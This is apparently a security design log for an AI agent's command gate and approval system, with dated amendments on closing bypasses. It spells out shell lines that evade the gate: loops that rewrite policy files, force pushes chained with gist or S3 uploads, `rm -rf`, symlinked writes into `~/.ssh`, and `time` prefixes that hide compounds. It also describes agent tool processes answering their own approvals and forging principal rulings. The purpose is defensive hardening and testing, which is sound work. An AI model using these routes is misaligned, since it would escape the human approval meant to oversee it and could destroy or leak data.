- *Amendment 2026-10-28 (issue #547):* on a store line, #191's pass lifted a part's deny with a rule written for
  another command on the line. Under `matrix: {irreversible: {internal: deny, private: deny, public: deny}}` and
  `{match: {command: '^git push'}, decision: allow}`, `git push --force origin main && gh gist create
  ~/.exo/plugins/foo/__init__.py`, the same push with `aws s3 cp <file> s3://b/x` and with `gh issue create -R
  pub/repo -t x -F <file>` asked on main f28934a3 (`store_write ask floor`, `ask floor`, `ask posting`), and so did
  the same lines with a `policies/` file, while the push beside `/tmp/plain.txt` is `force_push deny matrix`. The
  store send leads such a line, and its own cell (costly, private) is not denied, so the rule does not lower the line
  and the rule step never runs the own text test (#394). The #191 pass then read the push part's matrix deny and
  lifted it, because the anchored rule matches the line and the push's own text. Now that pass, on a line a
  `store_write` leads, also asks an allow, log or ask rule keyed on `command` to pass the own text test of the whole
  line (`_line_own_test`, through `_whole_line_test`), as the rule step asks of a rule that would lower a line the
  store write does not lead: the rule must name the store write's own text, each command that would be stricter alone
  than the rule's decision, and each command that changes the shell for the rest. A rule that fails is passed over
  and added to `passed`, so `decide` also decides the line as before and keeps the stricter. A failure while the test
  is built or run counts as a fail. The answer does not depend on the part, so `_whole_line_test` keeps it per rule
  and the test runs once per rule on a line, not once per part (each run reads every part): the pass stays linear in
  the parts of a long line. Run once per part, a line of 3,000 denied pushes before a store send (about 98 KB) took
  9 to 11 seconds of CPU in `decide` under a rule that names every command or `'.'`; once per rule it takes about a
  tenth of a second under that one rule, as on main, and a test bounds it with `time.process_time()`. A rule that
  fails the test is still passed over at each part that a later rule lifts (a memo lookup and its two regex
  matches), so the pass grows with the parts times the rules ahead of the one that lifts (review 5690862857). On the
  same 3,000 pushes (`git push --force origin b<i>`) before `gh gist create ~/.exo/plugins/foo/__init__.py`, with 0,
  19 and 99 allow rules on `'^git push'` ahead of one rule that names every command, `decide` took 0.06, 0.28 and
  0.96 s of CPU, against 0.05, 0.10 and 0.12 s on main a1dd4fec (the best of three, `time.process_time()`); with the
  push rules alone the first push's deny ends the pass, about a tenth of a second on both (0.11 to 0.12 s on
  main, 0.12 to 0.15 s here, where the rule passed over adds one more pass). The change only passes more rules
  over in that pass, so each part denied before is denied now: nothing decides lower. With the store send first, or
  with an `rm` or `curl -T` tail (denied by that part's own cell), main already denies, and so do key lines
  (`~/.exo/keys/k`, a secret line). One rule that names every command on the line (`'^git push|^gh gist
  create|...'`) lifts the deny as before, and the store floor still asks. Separate rules that each name one command do
  not combine: each is tested on its own, so under `{match: {command: '^git push'}, decision: allow}` and `{match:
  {command: '^gh gist create'}, decision: allow}` neither names the whole line and the push-first store line is
  `store_write deny matrix` where main a1dd4fec asks at the floor; that matches #394 on a line with no store write
  (the same push beside `/tmp/plain.txt` is `force_push deny matrix` under both rules, on main too). The gate differential against main f28934a3 (main's
  `scripts/gate_diff.py`, `--jobs 2 --timeout 0`): the built-in corpus with `--no-variants` (12,631 actions under 88
  policies, 1,111,528 pairs) lowers 0 pairs and tightens 73 pairs on 73 actions, all `store_write ask ->
  store_write deny`; 284 pairs keep their outcome with another reason (a deny that now names the push rather than a
  later part). An aimed corpus of 5,034 lines (7 deny-able commands, among them three push forms, `rm -rf
  build` and `npm publish`, beside 13 sends, writes, deletes and reads of 9 files in `plugins/`, `policies/`,
  `state/`, `update/`, the ledger, `keys/` and `/tmp`, in both orders with `&&`, `;` and `||`, and three-command
  lines), run alone (`--only-corpus`, 10,068 actions) under the 88 built-in policies and 100 more (matrices that deny
  the irreversible or costly cells, anchored, unanchored, log and ask rules on the push, rules that name every
  command, category lines, deny and reserved entries), lowers 0 of 1,892,784 pairs and tightens 32,334 pairs on
  4,686 actions, all `store_write ask -> store_write deny`; 7,682 pairs keep their outcome with another reason.
  Tests: `tests/security/test_gate_store_lift_own_text_547.py`.
  *Revisit if:* the #191 pass should ask the whole line test on every compound line, not only on one a store write
  leads. Elsewhere a rule that names a part still lifts that part's deny when the line's lead is not denied by its
  own cell and the rule does not lower the lead: under a matrix that denies only the costly cells and `{match:
  {command: '^gh gist'}, decision: allow}`, `gh gist create /tmp/plain.txt && git push --force origin main` asks
  (`force_push ask matrix`) on main and here, while the push-first order denies; a guard row pins both.
- *Amendment 2026-10-28 (issue #857, a #479 follow-up):* the loop's first command counts too. For `while` and
  `until` it is the condition's, which bash runs on every pass, so in `while cd ~/.exo/policies$(cp /tmp/evil
  gates.yaml); do sleep 1; done` the `cp` runs in the original folder on the first pass and in the store from the
  second (bash 5.2 writes the policy file; the same with `until ! cd`, backticks, `pushd`, a `< <(..)` on the `cd`
  and a `cd` inside an `if` in the condition). `_loop_spans` took a loop only when its `cd` sat after the loop's
  first command (`bisect_right`), so these six lines were allowed reads on main 1401ff81 under every policy, and
  the exo-gate hook allowed them in every mode, `deny: [store_write]` included. It now takes the first command too
  (`bisect_left`); a `for` or `select` header holds no `cd`, so only `while` and `until` change. The rows are
  `store_write`, ask the principal alone and deny under `deny: [store_write]`, read as the #479 rows are. A
  condition's `cd` into a descriptor folder names that folder when the loop holds no other store `cd`, so `while cd
  /dev/fd < <(cp /tmp/evil 3); do :; done` is a `store_write` on `/dev/fd` that `deny: [target:/dev*]` denies; when
  the body holds a `cd` of its own, the body's names the second pass, as on main, since that pass starts where the
  last `cd` left it (reviews of #858: taking the condition's folder first dropped main's reading of `while cd
  /dev/fd; do cp /tmp/evil 3; cd /proc/self/fd; done`, deny to ask under `deny: [target:/proc*]`). A
  condition's `cd` into the store with nothing that writes, a condition's `cd` into a plain folder, and a closer's
  `< <(..)` (bash runs it once, before the first pass) keep main's reading. Differential (main's `scripts/gate_diff.py`, main 938b027a
  against this change): the built-in corpus with variants, the 4,804 condition lines below and 6,240 lines that
  mix a condition `cd` and a body `cd` into the store, `/dev/fd`, `/proc/self/fd` or `/dev/fd/3` (`while`, `until`,
  `while !`, `{ }` and `for`; `cd`, `builtin cd`, `cd -P`, `pushd`; `< <(..)`, `<<< "$(..)"` and `$( )`; `cp`,
  `rm -rf` and `git push` bodies), under the 88 built-in policies and seven more that keep `/dev*`, `/proc*` and
  `*store*` target rules apart, lower 0 of 10,616,630 pairs and tighten 282,981 on 3,337 actions. The first draft
  of the descriptor rule, which took the condition's folder before the body's, lowered 4,992 pairs on 2,048 of the
  mixed lines under the split rules. The 4,804 condition lines: six condition shapes, `cd`, `pushd`, `builtin cd`
  and `cd -P`, eight folders, five substitution forms, five bodies. Tests:
  `tests/security/test_gate_loop_cd_store_479.py` (`COND_ROWS`; 11 of its tests fail without the change: the six condition rows, the descriptor row and four hook rows).
  *Revisit if:* the same as #479's.
- *Amendment 2026-10-29 (issue #853, to the #479 amendment's decision):* a compound command behind bash's
  pipeline prefixes is read as the same compound without them, beside main's reading, which lifts the #479
  amendment's `time` limit. bash's grammar takes `time`, `time -p`, `time --`, `time -p --` and `!` before a
  pipeline, together too (`time !`, `! time`, `time time`, `! !`, `time -p ! time --`), where a command starts:
  the start of a line, after `&&`, `||`, `;`, `&`, a newline, `(`, `{`, `do`, `then`, `else`, `elif`, `if`,
  `while`, `until` or a case pattern's `)`, but not after `|` or `|&` (bash's `time_command_acceptable`); the
  compound after them (`for`, `while`, `until`, `select`, `if`, `case`, `{ ..; }`, `coproc`, and a `function f
  { ..; }` definition, whose body runs when `f` is called) runs as without them. `bash -n` (5.2.21) on probe
  files whose every command is `:` accepts each of those spellings (`time ! function f { :; }; f`, `time -p !
  function ..`, `time -- ! function ..`, `! time ! function ..` and `time time ! function ..` too) and rejects
  `time -p -p for ..`, `time -- -p for ..`, `time -p -- -- for ..`, `!for ..`, `: | time for ..`, `: | ! for ..`,
  and a simple command or an assignment before a compound (`: for ..`, `nohup for ..`, `command for ..`, `env
  X=1 while ..`, `sudo -n while ..`, `X=1 time for ..`, `> f time for ..`), so those run nothing. `_parse` reads
  `time` as a program that takes options (`_PREFIXES`, GNU time's `-o` and `-f`), so the compound after it was
  that program's argv: on main a1dd4fec `time for i in 1 2; do cp /tmp/evil gates.yaml; cd ~/.exo/policies; done`
  and its `time -p`, `time --`, `time !`, `! time`, `while`, `until`, `select`, `for ((..))`, `for ..; { ..; }`
  and `time coproc for ..` forms asked as `opaque_exec`, `deny: [store_write]` did not deny them, a seat the
  approvers name could answer them and the hook's bypass auto-allowed them; `time { rm -rf /srv/data; }`, `time
  -p { git push --force origin main; }` and `time ! { curl -X POST .. }` asked as `opaque_exec` where their
  twins without the prefix deny under `deny: [delete]`, `[force_push]` or `[web_post]`. (`! for ..` alone was
  read already: `!` is one of `_OPENERS`.) A `function f { ..; }` definition was read behind `time` or `!`
  alone, but not behind both: `time ! function f { rm -rf /srv/data; }; f` and its `time -p !`, `time -- !`, `!
  time !` and `time time !` forms asked as `opaque_exec` where the twin denies under `deny: [delete]` (a #479
  store loop in such a body was found by the store scan already). Now, while classify reads a call (`_classify_reading`), `_parse_line`
  marks each unquoted `time` in command position that bash takes as the reserved word (`_time_at`: no `|` or
  `|&` feeds the command, and only `!` words or one of the reserved words above come before it in the command)
  and that is followed, through its `-p` and `--` and further `time` and `!` words, by a compound opener
  (`_time_prefix`). When the call has one, classify reads it a second time with `_opening` on, where
  `_parse_line` leaves those `time`, `-p` and `--` words out (`_opened_reading`, with budgets and memos of its
  own), so the compound is opened as without them: its parts, their categories and #479's second pass of a loop
  that `cd`s into the store. That reading is kept beside main's by `_beside`, as #584's joined reading and #479's
  second reading are, and each reading's D-074 `ordinary` reading is kept too, each read once (main's reading
  reads its own without opening it, and the second reading reads its own), so `decide`, `no_grant` (and through
  it the exo-gate hook's bypass floor) and `call_approvers` read both (`gate.readings`). The issue's rows are a principal-only `store_write`
  part that `deny: [store_write]` denies, no grant covers and bypass keeps at its floor, while main's
  `opaque_exec` reading still leads on the tie; `time { rm -rf /srv/data; }` is a delete. Main's reading is the
  first reading, unchanged, so no line decides lower: `time { ls; }` still asks as `opaque_exec`, and a quoted
  `'time'` or `\time`, `time -o f ..`, the syntax errors above and a line with no such prefix are read once, as
  on main. Teaching `_parse` the prefixes directly would have replaced main's reading of every `time` line with
  a new one; the second reading is smaller (one marker in `_parse_line`, one more reading in classify) and keeps
  main's reading by construction, as #546 keeps main's reading of a quoted prefix assignment. Cost: such a line
  costs about main's reading plus its twin's (`time.process_time`, best of five, this tree against main
  a1dd4fec: 20 prefixed loops on one line 0.074 s against 0.021 s, their twin without `time` 0.042 s; the same
  loops each followed by `echo x > ~/.exo/config.json`, which adds each reading's D-074 `ordinary` reading,
  0.284 s against 0.058 s, twin 0.234 s; 300 `time { :; }` groups 0.075 s against 0.043 s; 150 `time !` before
  one group 0.014 s against 0.009 s). Known limit:
  main does not open a `coproc` compound right after `!`, `then` or `{` (`! coproc for ..`, `if ..; then coproc
  for ..`, `{ coproc for ..; }` ask as `opaque_exec` without a `deny: [store_write]` deny), with a prefix or
  without; that is `coproc`'s own gap, not the prefix's. The differential against main a1dd4fec (main's
  `scripts/gate_diff.py`, `--jobs 2 --timeout 0`): the built-in corpus with `--no-variants`, 13,270 actions
  under the 88 policies (1,167,760 pairs), lowers 0 pairs and tightens 79 pairs on 9 actions (`opaque_exec allow`
  to `opaque_exec ask` 40, `opaque_exec ask` to `opaque_exec deny` 16, `opaque_exec log` to `opaque_exec ask`
  16, and 7 to `delete`); 106 pairs keep their outcome with another detail. An aimed corpus (`--only-corpus
  --no-variants`) of 10,572 lines puts the 11 prefix spellings above and none before 419 compound lines (the 9
  loop forms with 8 store-`cd` bodies, 12 group forms, `function f { ..; }; f`, `function f () { ..; }; f` and
  `f() { ..; }; f` among them, with delete, store, force-push, post, credentials, opaque and plain bodies, nested
  and chained prefixes), and 21 of them under 22 wrappers each (`&&`, `||`, `;`, a newline, `&`, a subshell, a
  pipe into one, `bash -c`, `$( )`, `if`, a function, and the guards `true |`, `nohup`, `command`, `X=1`,
  `'time'`, `\time`, `time -o f`); under the 88 policies and 126 more (deny, reserved, category, category-rule,
  command, command-rule and target entries, 214 in all, 2,262,408 pairs) it lowers 0 pairs and tightens 28,559
  pairs on 2,054 actions, mostly `opaque_exec ask` to `opaque_exec deny` (6,130), `opaque_exec allow` to
  `opaque_exec ask` (6,034), `opaque_exec ask` to `force_push deny` (3,654) and to `delete deny` (2,601); 190,906
  pairs keep their outcome with another detail. No classify or decide errors. Tests:
  `tests/security/test_gate_pipeline_prefix_853.py` (521 tests, which also collect alone; 158 fail on main
  e86af96c and pass here, the other 363 pass on both) and `tests/security/test_gate_loop_cd_store_479.py`, whose known
  limit row `test_a_loop_behind_time_is_a_known_limit` is now `test_a_loop_behind_time_is_read_as_without_it`
  (2 rows that fail on main a1dd4fec).
  *Revisit if:* the gate parses bash's pipeline grammar itself: `time` and `!` then belong to `_parse`, and this
  second reading can go.
  *Amendment 2026-10-27 (exo-desktop #52):* a file tool's write through a linked folder is read where it lands.
  `write_file`, `edit_file` and `apply_patch` follow a link in a path's folders, as the kernel does, and refuse
  only a link at the last name. The store and secret checks already resolved the path (#209), so such a write into
  a store asked, but the call's target, summary and parts named only the path as spelt. So the principal's question
  for `cfg/authorized_keys` never named `~/.ssh`, `deny: ["target:*/.ssh/*"]` only asked there, and under
  `deny: ["target:*/shared/*"]` the absolute path and `../shared/plain.txt` were denied while `o/plain.txt`, with
  `o` a link to that folder, was an allowed local write: the link was the one spelling no entry on the place could
  reach. Now each path whose folders a link leads elsewhere adds a `local_write` part whose target is the place it
  lands (the folders resolved, the last name kept), and the call's summary names that place. The call keeps its
  category and its target as spelt, so its approvers stay as before and a grant is keyed on the spelling. A
  relative path is read from the session's folder as resolved, so a link to that folder itself adds nothing. The
  tools are unchanged.
  Chosen over a refusal in the tools: they take absolute paths and `..` by design, so a write outside the working
  folder was never refused. A refusal of a link that leads out of it would refuse a store write the principal
  approved, which the #241 amendment rules out, and every write through a system link such as macOS `/tmp`. The
  issue's second finding, a secret-store check in the write tools, did not reproduce: the gate asks for every
  store or secret write these tools make (each patch operation too), named or through a linked folder, with no
  grant and the principal alone for the store, so a refusal in the tool would reverse #241. A session started
  inside a store folder still writes it by relative names as before (the known limit under "The tool's own
  folder" in `docs/GATE.md`). Main's `scripts/gate_diff.py`, run against main 080e87ba over 91,807 actions and 88
  policies, finds nothing lowered and nothing tightened: 14 pairs keep their outcome with another detail changed.
  That run is on Linux, where `/tmp` is not a link. The cost: the gate cannot tell a planted link from a system one.
  On macOS `/tmp` is a link to `/private/tmp`, so `write_file /tmp/x` adds a part for `/private/tmp/x`. An allow
  rule matches the call as spelt, and the part is decided on its own (#191). So a policy that denies `local_write`
  and allows `target:/tmp/*` now denies that write, naming the place, until it allows `target:/private/tmp/*` too.
  The default policy still allows it. A reserved entry that matches another part of a call keeps the principal's ask
  from any grant (D-075). So under a reserved entry on the place, or `reserved: [local_write]`, an "always" for
  `o/plain.txt` no longer covers the next such write, which asks each time: the link may lead elsewhere by then. On
  main the entry on the place did not reach the write, and a grant covered it under `reserved: [local_write]`.
  Tests: `tests/security/test_gate_file_tool_links.py` (25 of 26 rows fail on main) and the grant rows in
  `plugins/exo-gate/tests/test_approvals.py` (both fail on main).

### Amendment proposal, 2026-10-29: Invariant gh field parsing (#550)

The body, title and body-file options shared by one gh target-reading set are parsed once, and target membership uses a set without dropping or reordering any target. This reduces repeated classification work only. The quadratic decide path, the quoted option-order corner and alt-target serialization redaction remain open; the existing decide-growth expected failure remains.

The aimed 17-action by 88-policy differential has zero lowered pairs and zero classification/decision errors. A deterministic option-word scan counter fails before and passes after; it is not an end-to-end latency or event-loop bound claim.

## D-039 (2026-10-12) Approval identity from the connection; web token on every route; one secret scrub
- **Why:** the 2026-10-12 audit. (a) `approval.respond` took the answerer from its body: an empty `client` meant
  the principal, so a bash tool call (same user, socket 0600) could connect to the core's socket and answer its own
  approvals with `allow_always`. (b) `exo web` re-exposed the whole protocol and the event stream with no token;
  its only CSRF defence was Origin equals Host, which DNS rebinding defeats; `asgi.py` had no check at all. (c)
  Secret scrubbing for tool subprocesses was a suffix rule written three ways, and the claude-cli provider passed
  almost the whole parent environment.
- **Decision, identity:** the transport stamps a caller for every command (`exo/principal.py`, a context variable
  set by `Dispatcher.run` and cleared when the command returns, so a task it started does not inherit it). In
  process (the terminal client's own core, the web's in-process dispatcher) the caller is `principal:<label>`.
  On the Unix socket it is the principal only when the request carries the per-launch credential in
  `X-Exo-Principal` and the connecting process (`LOCAL_PEERPID` on macOS, `SO_PEERCRED` on Linux) is not a
  descendant of the core. Everything else, stdio and TCP included, is `local`. The credential is a random token
  in `<socket stem>.principal.key` beside the socket (0600, in the 0700 run folder), new per launch, deleted on
  stop, never in an environment variable. Clients that are the principal (`exo`, joined windows, `exo chat`, the
  web) read it per request, so they re-join a restarted core.
  *Amendment 2026-10-17 (bus ingress):* a third caller, `channel`, for the channels exod runs. `serve()` hands them
  `ChannelLink`, which runs their commands in process and stamps `channel`. No transport ever stamps it. `peers`
  action `bus` (D-040) pins a seat's key on first sight, and it now takes only this caller, so a tool subprocess on
  the socket cannot pin an unseen seat to its own key and speak as that seat. Rejected: requiring the principal.
  The channel was a local socket client, so every first message from a new seat would be refused and trust on
  first use would end. Also rejected: a leader-signed pin, which needs a leader key the principal pinned, and no
  home has one by default. A same-user process that writes `keys/registry.json` directly stays out of scope (D-040
  "Not covered"). The bus seat registry, `$EXO_HOME/bus/registry.json`, is not yet a store path, so a plain `cp` to
  it is not asked about (#210).
- **Decision, approvals:** a principal connection answers as the principal (`client` is a label: `by` is
  `principal:tui`). A local connection answers only as `seat:<name>` with the D-033 signature, and never with
  `allow_always`. `approver_identity` returns `unknown` for an empty or unrecognised name, and `unknown` may not
  answer. The attack test (`tests/security/test_approval_identity.py`) runs a background bash job that finds the
  pending approval and tries `allow_always` with every body and with the stolen credential: all refused.
- **Decision, web:** every `/api/` route and both event streams need the page token (`X-Exo-Token`, or `?token=`
  on the streams, since EventSource cannot set headers). Host must be `127.0.0.1:<port>`, `localhost:<port>` or
  `[::1]:<port>`, for the page too. Origin and Sec-Fetch-Site checks stay. Only the page shell is served without
  the token. The token stays per launch, in memory, delivered in the URL fragment that `exo web` prints and opens.
  `asgi.py` is deleted (unused).
  *Amendment 2026-10-28 (issue #740):* the approval POST checks that its parsed JSON is an object before reading
  `decision`. Arrays, null and scalars get a 400 JSON error and send no `approval.respond` to the core, as the
  shared POST body reader already requires. Malformed JSON keeps its `bad json` response; token checks and valid
  approval answers are unchanged. `docs/ui/WEB.md` "Opening the page and the page token".
  *Amendment 2026-10-28 (follow-up to #751):* the approval and shared POST body readers catch JSON decoder
  recursion errors as input errors. Arrays and objects beyond the decoder nesting limit, within the body-size
  limit, receive the readers' existing 400 JSON errors without a core command or provider dispatch. Token checks
  keep their existing order. `docs/ui/WEB.md` "Opening the page and the page token".
  *Amendment 2026-10-28 (exo-desktop #55):* `GET /api/chat/sessions` takes a `limit` from 1 to 500, 100 when none
  is given. A larger limit is cut to 500, as before. A limit below 1 gets a 400 JSON error and sends no
  `session.list` to the core, as a limit that is not a number already did. Before, only the top was cut, and
  SQLite reads a negative `LIMIT` as no limit, so `limit=-1` returned every session. A 400, not a cut to 0,
  names the caller's mistake. `docs/ui/WEB.md` "What is where".
  *Amendment 2026-10-17 (issue #162):* the page builds every node with `h()` and text nodes, and that discipline
  was the only XSS defence, while every `ui` Markdown panel (and, with #149, every completed reply) goes through
  `markdown.js`: one renderer slip would be a stored XSS reachable by prompt injection, holding the page token. Every
  response the web server writes (page, static files, JSON, both event streams, errors) now carries one policy,
  `server.CSP`: `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self';
  object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`, with
  `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`. It is the issue's draft narrowed to what
  the page uses: no WebSocket (fetch and EventSource only, so `connect-src 'self'`), no images from `data:`, no
  fonts, and no native form posts (every form is handled in script). No `'unsafe-inline'`, `'unsafe-eval'`, hash
  or nonce: the page had no inline script, and its few computed sizes (gauges, bars, the task board) now go
  through the CSSOM (`el.style.cssText` in `h()`), which the policy does not block, instead of a `style`
  attribute, which it does. Rejected: a `<meta>` policy (cannot set `frame-ancestors`, and misses the JSON and
  stream responses); `'unsafe-inline'` for styles (would let injected markup restyle the page into a lure).
  `docs/ui/WEB.md` "Content-Security-Policy".
- **Decision, environment:** one function, `exo.envscrub.scrub_env`, for bash, jobs and `code_find`: catalog
  `key_env` names, secret suffixes and words, `AWS_*`, `GH_*`, `GITHUB_TOKEN`, `*DATABASE_URL`, `*_DSN`, the bus
  identity, the core socket and credential variables, and a new seat `[tools] env_deny` (names or patterns).
  `env_allow` keeps a name; `env_deny` wins. The claude-cli child gets `minimal_env` (PATH, HOME, locale, terminal,
  CLAUDE_CONFIG_DIR, proxies, CA bundles) plus its switches.
  *Amendment 2026-10-16 (issue #135):* the scrub also drops inherited shell startup hooks (`envscrub.EXEC_HOOKS`):
  `BASH_ENV`, exported functions (`BASH_FUNC_<name>%%`), `SHELLOPTS` and `BASHOPTS`, which bash itself acts on at
  startup; `ENV`, which an interactive POSIX shell the command starts reads; and `PS4`, which matters once xtrace is
  on (bash expands it before every traced line, so a `$(...)` in it runs a command). They are a separate exact-case
  set, not secret names: `is_secret_name` case-folds and also classifies URL query keys and CLI diagnostics, so
  `ENV=dev` or `?env=staging` must not count as a credential. The same `env_allow` (exact) and `env_deny` precedence
  applies. The bash tool and background jobs start bash as `bash --norc -c`: with `SSH_CLIENT` or `SSH2_CLIENT` set
  and `SHLVL` unset or 0, a plain `bash -c` (in many builds) sources `~/.bashrc`, a file the default
  gate lets a tool call write, and skips an allowed `BASH_ENV`; `--norc` stops the first and still honours the
  second. Limits: loader and interpreter hooks (`LD_PRELOAD`, `PYTHONPATH`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`,
  `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF`) pass, since they have everyday development uses; `bash -p` was rejected
  because it would silently defeat an exact `env_allow` for a trusted startup file. Documented in `docs/TOOLS.md`.
  *Amendment 2026-10-18 (issue #159):* git's environment config is dropped by default, since its values can carry
  credentials (an `http.extraHeader` bearer token): `GIT_CONFIG_PARAMETERS`, kept only by an exact `env_allow`, and
  the numbered family `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`. The family is one unit,
  because a count without its keys fails every git command: it is kept whole only when `env_allow` names
  `GIT_CONFIG_COUNT`, and dropped whole when `env_deny` or the token-format value check drops any member. So an exact
  `env_allow` of a single `GIT_CONFIG_KEY_<n>` or `GIT_CONFIG_VALUE_<n>` no longer keeps it, an exception to
  "`env_allow` keeps a name". Documented in `docs/TOOLS.md`.
  *Amendment 2026-10-19 (PR #222):* redacting key values out of text has one match model too, `keys.secret_spans`.
  `keys.redact_secrets` uses it for every caller: tool results in the registry, the engine's `tool.output` pieces, the
  claude-cli provider, provider test and setup errors, and the `bash` stream. The values go longest first. Each value's
  matches are found from the left, as `str.replace` finds them, in the text with the spans of the values before it
  blanked out. So no match overlaps a span taken before. All matches are found in the text itself. Then one `[redacted]`
  marker goes in per span, in one pass. So no value can match across a marker. Before, each value replaced its matches
  in turn, and a later value could match text that held an earlier marker. Output changes only for a key value that
  holds `[` or `]` or is part of the word "redacted". `keep_markers` takes each `[redacted]` already in the text first.
  The engine's second pass over a streamed piece uses it. So that pass leaves the stream's redaction as it is and cuts
  out only a key learned since. The `bash` stream holds back the longest end of the unsent text that could start a key.
  Then, value by value in redaction order, a value's first match that would cross the cut moves the cut back to that
  match's start. So no span of the whole output crosses a cut, and the stream equals redacting the whole output with the
  key values known when the command starts. The held text stays under twice the length of all key values together. What
  still goes out: a key value learned while the command runs is cut out only inside one piece, so such a key split
  between two pieces goes out in two parts. The result is redacted whole, with every key value known when the call
  returns. But every cut made to a result comes before that: any cut a tool makes in its own output, and the registry's
  100,000-character result cap. For example, `bash` keeps 15,000 characters at each end of a longer output, `job_output`
  keeps the last 20,000, `read_file` cuts a line at 2,000 characters, `grep` cuts a line at 300 and `jobs` cuts a
  command at 100. So a key value that such a cut splits leaves a part in the result, as it did before this PR. The
  `bash` stream is redacted before its cut, so its pieces hold no such part. A background job's completion notice had no
  redaction at all. It now reads the job's whole log file and cuts out the key values known when the job ends. Only then
  does it cut its command and output to size, so those cuts split no key. A key split where that file rotates at
  `output_cap` is cut out too (a follow-up to PR #321): while the log is redacted, the end of the older file stands in
  for the rotation note at its start. `job_output` drops that note when it reads the older file, so such a key is whole
  in its result and is redacted there too. If the log rotates in the moment between its reads of the two files, the
  output that rotated is missing, and a key split at either end of it can leave a part there. The `job.updated` events
  did not redact the command they carry. They now cut known key values out of it before they cut it to 300 characters.
  As before, only key values Exo knows are redacted: `known_secret_values`, or the list a caller passes (claude-cli
  passes the secret-named variables of its own environment). Rejected: holding all output until the command ends (no
  live output). `docs/TOOLS.md` "Streamed output", `docs/JOBS.md` "The completion notice".
  *Amendment 2026-10-20 (PR #346):* each match blanks out text that a later key would match. So keys that overlap
  each other, or a key whose end repeats its start, can change the matches further back than one key's length. A
  chain of three keys left the last 8 characters of the third in a completion notice. The end of the older file put
  in front of the live log now doubles, up to the whole file, until the text before it can change no match in the
  live log. Such text can change a value's matches up to its length less one in. A match that starts where matches
  may change moves that point to its end, for the values after it as well. So the notice never keeps a character
  that redacting both files as one text would cut out. Only a key split inside a character outside ASCII still
  leaves a part. The notice reads more of the older file only when a match nears the rotation, at most all of it, so
  the cost stays linear in `output_cap`. The cut `job_output` makes before redaction can leave a part of a key next
  to the key it splits, when keys overlap each other. The `bash` stream has no such gap, since it equals redacting
  the whole output. Rejected: reading the whole older file for every notice after a rotation (5 MB by default).
  `docs/JOBS.md` "The completion notice".
- **Rejected:** dropping `EXO_HOME` from tools (the default path is guessable, and tools run `exo`); a token in a
  cookie for the event streams (rides cross-site requests); trusting the TCP bearer token as the principal (TCP
  has no peer process to check); a one-time bootstrap code for the page (more moving parts than the fragment buys
  today).
- **Limits:** a tool process is the same OS user. Code that reads the credential file without the gate seeing it
  (the gate classes a read of the file, of its run folder or of a wildcard there as `credentials`, always ask,
  #169; indirection is the gate branch's work) and also detaches from the core's process tree could still pass.
  The real fix is an OS sandbox for tool subprocesses. The page link sits in browser history and, briefly, in the
  browser launcher's argv. The env scrub is a
  heuristic.
- **Not changed:** the TUI approval card's focus behaviour (another branch is editing the TUI); noted for later.
  The echo engine (a test double) still accepts any answer.
- **Later (2026-10-17, #166):** the launcher's argv was a real leak, not a brief one: `webbrowser.open` hands the
  `#token=` link to `xdg-open` and the browser, whose command lines any user of the host can read in `/proc` unless
  it is mounted with `hidepid`, and the token answers approvals as `principal:web`. So the one-time bootstrap code
  rejected above is now how the browser opens: `exo web` opens `#code=<one-time code>` (fresh per launch, in memory,
  one use, 120 seconds), and the page trades it for the token at `POST /api/launch`, the only `/api/` route without
  the token, with every other check of `providers.guard`. A used code that comes back means two parties held it: the
  token is replaced, every other connection ends (the old token's streams, and requests that passed the token check
  but still wait for their body), a body is checked against the current token again once read, and the terminal
  gets a warning and the new link, to paste into the open browser rather than click (a click puts it back in a
  launcher's argv). The printed `#token=` link is unchanged (stdout is the user's own); with a non-loopback `--host`
  no browser is opened. Limit, stated plainly: the hop from the browser to the web server is not checked by uid. Any
  process on the host that has the token, or wins the race for an unused code inside its 120 seconds, is the page.
  The race shows up as a replaced token and a terminal warning only when the launched page also redeems the code
  after the winner: the first redemption is silent. A browser that never runs the page's script (a text browser
  such as `lynx` or `w3m`, which `webbrowser` falls back to with no display) never redeems, so the winner keeps a
  working token and nothing warns. Kernel peer checks do not cover this hop either: D-060 (#175, Unix peer
  authentication) checks clients of the core's socket, not a browser on TCP, and must name this hop in its Limits
  when it lands. Rejected for now: opening a 0600 local file that redirects to the `#token=` link
  (the other fix #166 named). It needs no second redemption, but leaves the token on disk until removed, and a
  sandboxed browser (snap, flatpak) may not read the file. Revisit if launches without a script-running browser
  matter. `docs/ui/WEB.md` "Opening the page and the page token".

## D-040 (2026-10-12) Who wrote it: authors on every message, pinned keys, an anchored ledger head
- *Amendment 2026-10-28 (desktop audit #53):* the bus channel skips encrypted envelopes sealed to another seat and unreadable encrypted bodies before session allocation or core ingress. The inbox cursor still advances; reader tools retain their placeholders. A core-call failure still retries the envelope.
- **Why:** the 12 October audit (priorities 4 and 6). (a) `exo_note` let the agent write `kind="ruling"`, and
  consolidation and `principal_said` checked the kind, not the author, so an agent-written "always force push to
  main" became a belief proposal that promotion rule 1 would accept. (b) Per-turn capture got bare role and content,
  so a peer message or job notice framed as a ruling was saved as the principal's. (c) The bus channel turned any
  inbox envelope into `turn.send`: a principal turn, no hold or trust policy, reply posted back; and the relay's key
  was accepted as any seat's. (d) Ledger verify trusted the key inside each event, nothing passed `trusted`, and
  dropping the trigger, deleting the tail and restoring the trigger verified clean.
- **Authors:** the core stamps `meta.author` on every message from its way in: `principal` (a client's
  `turn.send`), `agent`, `tool`, `peer:<name>`, `bus:<seat>`, `job`, `delegate`, `schedule`, `system`
  (`src/exo/provenance.py`). Never from the text. `is_principal` needs `principal`. Every memory and learning hook
  gets the author and a `principal` flag per message; capture, consolidation, promotion, review signals and handoff
  pins read text as the principal's only when it is. The agent's `exo_note` keeps `ruling` and `answer` as a
  `note` of type `agent_note`; `exo_should_have_been` is signed as the agent. Ledger authors that are the principal:
  `principal`, the store's id, and ids in the key registry.
- **Bus:** the channel calls `peers` action `bus` (one more action, no new command). The core
  (`src/exo/bus/ingress.py`) checks the envelope against the seat's pinned key (pinned on first sight, refused when
  it changes), frames it as a bus message with author `bus:<seat>`, and runs the peer policy: `remote` is held by
  default. The channel posts a reply only for a turn that an auto-delivered message started. The relay signs with its
